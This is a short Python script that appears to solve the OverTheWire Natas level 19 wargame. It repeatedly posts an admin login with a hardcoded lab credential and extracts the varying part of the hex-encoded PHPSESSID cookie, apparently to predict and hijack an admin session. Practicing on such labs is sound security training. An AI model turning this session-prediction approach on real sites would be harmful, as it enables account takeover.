import requests , string
from requests.auth import HTTPBasicAuth 
import re 

proxies = {
  "http": "http://localhost:8099",
}


Auth=HTTPBasicAuth('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')  
headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Accept-Language': 'en-US,en;q=0.5','Accept-Encoding': 'gzip, deflate','content-type': 'application/x-www-form-urlencoded','Content-Length': '29','Origin': 'http://natas19.natas.labs.overthewire.org','Connection': 'keep-alive','Authorization': 'Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==','Referer': 'http://natas19.natas.labs.overthewire.org/','Upgrade-Insecure-Requests': '1','Host': 'natas19.natas.labs.overthewire.org'}  

  
for i in range(20): 
    payload = 'username=admin&password=admin'
    # response = requests.post('http://natas19.natas.labs.overthewire.org/index.php', headers=headers, auth=Auth, data=payload, proxies=proxies)
    response = requests.post('http://natas19.natas.labs.overthewire.org/index.php', headers=headers, auth=Auth, data=payload)
    response.encoding = 'utf-8'
    # print(response.text)
    # response.json()
    cookie = response.headers['Set-Cookie']
    m = re.search('PHPSESSID=3(.+?)2d61646d696e', cookie)
    if m:
        print(m.group(1))
        

